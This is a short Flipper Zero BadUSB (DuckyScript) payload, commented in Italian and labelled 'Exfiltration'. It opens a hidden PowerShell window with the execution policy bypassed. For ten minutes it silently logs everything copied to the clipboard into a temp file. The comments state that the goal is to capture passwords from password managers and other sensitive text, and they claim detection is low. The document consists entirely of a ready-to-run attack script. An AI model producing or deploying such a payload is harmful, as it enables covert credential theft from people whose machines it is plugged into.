REM Author:   FlipperZero-guide
REM Category: Exfiltration
REM Privs:    User (no admin)
REM Layout:   IT
REM Time:     ~6 secondi
REM Detect:   Basso - monitoraggio clipboard è silenzioso
REM Desc:     Monitora la clipboard per 10 minuti e salva
REM           tutto il contenuto copiato in un file.
REM           Cattura password copiate da password manager,
REM           testo sensibile, URL.
REM ============================================================

DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -c "$f=\"$env:TEMP\cb_$(Get-Date -f yyyyMMdd_HHmmss).txt\";$last='';$end=(Get-Date).AddMinutes(10);while((Get-Date) -lt $end){try{$c=Get-Clipboard -ErrorAction SilentlyContinue;if($c -and $c -ne $last){$last=$c;\"[$(Get-Date -f 'HH:mm:ss')] $c\" | Out-File $f -Append}}catch{};Start-Sleep 2}"
ENTER
